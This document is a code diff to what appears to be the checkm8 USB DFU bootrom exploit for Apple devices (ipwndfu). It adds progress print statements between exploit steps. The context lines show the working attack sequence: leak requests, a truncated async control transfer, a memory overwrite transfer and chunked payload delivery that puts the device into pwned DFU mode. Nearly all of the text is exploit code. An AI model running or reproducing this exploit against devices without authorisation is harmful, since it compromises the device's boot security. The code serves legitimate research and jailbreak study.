@@ -469,6 +469,7 @@ def exploit():
   if 'PWND:[' in device.serial_number:
     print 'Device is already in pwned DFU Mode. Not executing exploit.'
     return
+  print 'Prepare exploit'
   payload, config = exploit_config(device.serial_number)
 
   if config.large_leak is not None:
@@ -482,16 +483,21 @@ def exploit():
       no_leak(device)
     usb_req_leak(device)
     no_leak(device)
+  print 'Reset USB device'
   dfu.usb_reset(device)
   dfu.release_device(device)
-
+  print 'Acquire device'
   device = dfu.acquire_device()
   device.serial_number
+  print 'Send async 1-part'
   libusb1_async_ctrl_transfer(device, 0x21, 1, 0, 0, 'A' * 0x800, 0.0001)
+  print 'Send 2-part'
   libusb1_no_error_ctrl_transfer(device, 0x21, 4, 0, 0, 0, 0)
   dfu.release_device(device)
+  print 'Release device.. waiting...'
 
   time.sleep(0.5)
+  print 'Try acquire device'
 
   device = dfu.acquire_device()
   usb_req_stall(device)
@@ -500,11 +506,15 @@ def exploit():
   else:
     for i in range(config.leak):
       usb_req_leak(device)
+  print 'Send 3-part'
   libusb1_no_error_ctrl_transfer(device, 0, 0, 0, 0, config.overwrite, 100)
+  print 'Sending payload...'
   for i in range(0, len(payload), 0x800):
     libusb1_no_error_ctrl_transfer(device, 0x21, 1, 0, 0, payload[i:i+0x800], 100)
+  print 'Reset USB device'
   dfu.usb_reset(device)
   dfu.release_device(device)
+  print 'Try acquire device'
 
   device = dfu.acquire_device()
   if 'PWND:[checkm8]' not in device.serial_number:
